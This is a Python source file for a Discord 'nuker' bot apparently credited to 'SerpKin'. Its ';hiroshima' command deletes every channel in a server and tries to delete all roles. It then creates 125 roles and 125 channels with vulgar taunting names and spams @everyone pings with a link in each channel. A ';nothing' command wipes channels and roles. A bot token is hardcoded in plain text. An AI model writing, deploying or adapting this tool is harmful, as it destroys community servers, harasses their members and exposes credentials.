import discord
from discord.ext import commands
import random
import colorama
from colorama import Fore, Back, Style, init
init()

TOKEN = "MTA4MjYzMDAwNDMwNDc4MTM3NA.GgK1Oo.FZfrc03l9zeSu6LE8UOo5zAhu0UMVHo3kyDNmU"

client = commands.Bot(command_prefix = ";")
client.remove_command("help")

#discord bot's terminal
@client.event
async def on_ready():
    print(f"{Fore.MAGENTA}██╗      ██████╗ ██╗   ██╗███████╗██╗      █████╗  ██████╗███████╗")
    print(f"{Fore.MAGENTA}██║     ██╔═══██╗██║   ██║██╔════╝██║     ██╔══██╗██╔════╝██╔════╝")
    print(f"{Fore.MAGENTA}██║     ██║   ██║██║   ██║█████╗  ██║     ███████║██║     █████╗")
    print(f"{Fore.MAGENTA}██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██║     ██╔══██║██║     ██╔══╝")
    print(f"{Fore.MAGENTA}███████╗╚██████╔╝ ╚████╔╝ ███████╗███████╗██║  ██║╚██████╗███████╗")
    print(f"{Fore.MAGENTA}╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝╚══════╝")
    print(f"{Fore.MAGENTA}[1] ;hiroshima - Nukes [2]       |       [2] ;help - Displays This")
    print(f"{Fore.MAGENTA}------------------------------------------------------------------")
    print(f"{Fore.MAGENTA}[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left")

@client.command()
async def hiroshima(ctx):
    await ctx.send("**If you've never seen a massacre, this is what it looks like.**")
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            print("  DELETING CHANNELS: FAILED")
    for role in list(ctx.guild.roles):
        try:
            await discord.role.delete() 
        except:
            print("  DELETING ROLES: FAILED")
    for _i in range(125):
        try:
            await ctx.guild.create_role(name="Fucked By SerpKin.")
        except:
            print("  CREATING ROLES: FAILED")
    for _i in range(125):
        await ctx.guild.create_text_channel(name="Fucked By SerpKin.")
    for channel in list(ctx.guild.channels):
        for _i in range(5):
            try:
                await channel.send("@everyone SerpKin on Top https://media.discordapp.net/attachments/899357305273991179/907257662163537940/SPOILER_file.gif.")  
            except:
                print("  CREATING ROLES: FAILED")  

@client.command()
async def help(ctx):
    await ctx.send("**[1] ;hiroshima - Nukes [2]            |        [2] ;help - Displays This**")
    await ctx.send("**-------------------------------------------------------------------------**")
    await ctx.send("**[3] ;credits - Shows My Socials  |     [4] ;nothing - nothing left**")

@client.command()
async def credits(ctx):
    await ctx.send("**Bot created by SerpKin**")
    await ctx.send("**SerpKin**")

@client.command()
async def nothing(ctx):
        guild = ctx.guild
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                print("  DELETING CHANNELS: FAILED")
        for role in list(ctx.guild.roles):
            try:
                await discord.role.delete() 
            except:
                print("  DELETING ROLES: FAILED")

client.run(TOKEN)
